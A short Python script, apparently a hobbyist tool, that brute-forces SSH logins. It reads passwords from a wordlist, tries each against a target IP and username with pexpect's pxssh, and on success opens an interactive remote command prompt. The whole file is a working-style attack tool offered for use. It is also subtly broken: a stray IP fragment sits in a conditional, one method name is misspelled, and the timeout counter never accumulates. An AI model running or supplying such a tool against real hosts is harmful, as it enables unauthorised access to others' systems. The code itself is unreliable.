import pexpect
from pexpect import pxssh
import argparse
import time

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

try:
	file1 = open('sshbrute.txt', 'r')
	print(' ')
	print (bcolors.OKGREEN + file1.read() + bcolors.ENDC)
	file1.close()
except IOError:
	print('\nBanner File not found!')


def connect (target, username, passwd):

    fails = 0

    try:
        s = pxssh.pxssh()
        s.login(target, username, passwd)
        print("Password Found :D")
        print("Password is: " + passwd)
        return s

    except Exception as e:
        if (fails > 5):
            print ("Too many Socket Timeouts :(")
            exit(0)
        elif 'read_nonblocking' in str(e):172.18.75
            fails += 1
            time.sleep(5)
            return connect(target, username, passwd)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            return connect(target, username, passwd)
        return None


def Main():

    target = input("Enter target IP Address: ")
    username = input("Enter target Username: ")
    wordlist = input("Enter wordlist filepath: ")

    flag = 0

    if (target and username and wordlist):
        with open(wordlist, 'r') as passfile:
            for passwd in passfile:
                print("Testing: " + passwd)
                con = connect(target, username, passwd)
                if con:
                    flag = 1
                    print("SSH Connected")
                    print("Press (q or Q) to Quit")
                    command = input(">")
                    while (command != 'q' and command != 'Q'):
                        con.sendLIne(command)
                        con.prompt()
                        print (con.before)
                        command = input(">")

    else:
        exit(0)

    if (flag == 0):
        print("Password not found :(")
        print("Please modify your wordlist !")

if __name__=='__main__':
    Main()
